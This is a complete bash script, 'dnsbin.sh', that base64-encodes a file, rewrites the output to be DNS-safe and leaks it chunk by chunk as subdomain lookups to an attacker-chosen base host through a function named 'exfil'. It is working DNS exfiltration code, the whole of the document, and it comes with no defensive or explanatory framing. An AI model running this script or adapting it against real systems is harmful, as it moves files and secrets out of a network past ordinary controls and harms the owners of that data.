#!/usr/bin/env bash

set -euo pipefail

usage() {
    echo "Usage: dnsbin.sh basehost col_width filename"
}

exfil() {
    host "$1.$basehost"
}

if [ $# -ne 3 ]; then
    usage
    exit 1
fi

basehost="$1"
col_width="$2"
filename="$3"

if [ ! -r "$filename" ]; then
    echo "File not found: $filename"
    exit 1
fi

id=$RANDOM

exfil "start-$id"

while IFS= read -r line; do
    exfil "$line"
done < <(gbase64 -w$col_width -- "$filename" | tr '+/' '_-' | tr -d '=')

exfil "end-$id"
